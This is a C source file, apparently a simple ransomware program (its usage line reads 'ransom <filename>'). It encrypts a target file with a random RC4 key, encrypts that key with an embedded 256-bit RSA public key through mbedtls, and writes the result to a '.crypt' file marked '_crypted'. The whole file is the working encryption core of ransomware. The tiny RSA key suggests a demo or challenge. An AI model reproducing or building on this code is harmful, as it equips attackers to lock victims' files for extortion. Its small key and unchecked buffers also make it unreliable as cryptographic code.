#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "mbedtls/pk.h"
#include "mbedtls/entropy.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/arc4.h"


/*
The RSA public key (256 bits)
*/
static unsigned char public_der[] = {
  0x30, 0x3c, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d,
  0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x2b, 0x00, 0x30, 0x28, 0x02, 0x21,
  0x00, 0xd8, 0x9b, 0xb8, 0x07, 0x02, 0xa0, 0xd0, 0x81, 0x08, 0x7d, 0x93,
  0x95, 0x47, 0x18, 0x6c, 0x8d, 0xee, 0x14, 0x90, 0x33, 0x75, 0x9b, 0x70,
  0x27, 0xca, 0x79, 0x62, 0x29, 0x0f, 0x2a, 0x18, 0xe1, 0x02, 0x03, 0x01,
  0x00, 0x01
};

static unsigned int public_der_len = 62;
static mbedtls_entropy_context entropy;
static mbedtls_ctr_drbg_context ctr_drbg;

void init_mbedtls()
{
	char *personalization = "          ";

    mbedtls_entropy_init(&entropy);  
    mbedtls_ctr_drbg_init(&ctr_drbg);
    mbedtls_ctr_drbg_seed( &ctr_drbg , mbedtls_entropy_func, &entropy, (const unsigned char *)personalization, strlen(personalization));
}


/*
Encrypts the buffer using RSA PKCS#1 v1.5 padding
*/
void rsa_encipher_buffer(unsigned char* in_buffer, unsigned long in_buffer_len, unsigned char* out_buffer, unsigned long out_buffer_len)
{
	mbedtls_pk_context pk;
	size_t olen;

	// Initialize Public Key context
	mbedtls_pk_init(&pk);

	// Load public key in DER format
	mbedtls_pk_parse_public_key(&pk, public_der, public_der_len);

	// Encipher
	mbedtls_pk_encrypt(&pk, in_buffer, in_buffer_len, out_buffer, &olen, out_buffer_len, mbedtls_ctr_drbg_random, &ctr_drbg);

	// Free
	mbedtls_pk_free(&pk);
}

/*
Encrypts the buffer using RC4
*/
void rc4_encipher_buffer(unsigned char* in_buffer, size_t in_buffer_len, unsigned char* out_buffer, unsigned char* rc4_key, size_t rc4_key_size)
{
	mbedtls_arc4_context ctx;
	mbedtls_arc4_init(&ctx);
	mbedtls_arc4_setup(&ctx, rc4_key, rc4_key_size);
	mbedtls_arc4_crypt(&ctx, in_buffer_len, in_buffer, out_buffer);
	mbedtls_arc4_free(&ctx);
}


void encipher_file(FILE* src, unsigned int file_size, FILE* dest)
{
	unsigned char rc4_key[16];
	unsigned char *buffer, *output;
	unsigned char rc4_key_enciphered[32];

	// signature
	fwrite("_crypted", 1, 8, dest);

	// file size
	//fwrite(&file_size, 4, 1, dest);

	init_mbedtls();

	// Get some random bytes to be used as rc4 key
	mbedtls_ctr_drbg_random(&ctr_drbg, rc4_key, 16);


	// Encrypt rc4 key using rsa
	rsa_encipher_buffer(rc4_key, 16, rc4_key_enciphered, 32);

	fwrite(rc4_key_enciphered, 1, 32, dest);

	buffer = (unsigned char*)malloc(file_size);
	output = (unsigned char*)malloc(file_size);

	fread(buffer, 1, file_size, src);

	if (!buffer || !output)
	{
		puts("Failed to allocate memory");
		return;
	}

	rc4_encipher_buffer(buffer, file_size, output, rc4_key, 16);

	fwrite(output, 1, file_size, dest);
	free(buffer);
	free(output);
}

void main(int argc, char** argv)
{
	long file_size;
	char* buffer;
	char dest_file[256] = {0};

	if (argc < 2)
	{
		puts("No file name specified.");
		puts("Usage: ransom <filename>");
		return;
	}

	FILE* in_file = fopen(argv[1], "rb");
	if (!in_file)
	{
		puts("Cannot open file.");
		return;
	}

	fseek(in_file, 0, SEEK_END);
	file_size = ftell(in_file);

	if (!file_size)
	{
		puts("Empty file.");
		fclose(in_file);
		return;
	}

	// Go to start of file
	fseek(in_file, 0, SEEK_SET);
	strncpy(dest_file, argv[1], 255);
	strcat(dest_file, ".crypt");

	FILE* out_file = fopen(dest_file, "wb");
	encipher_file(in_file, file_size, out_file);	
	fclose(in_file);
	fclose(out_file);
}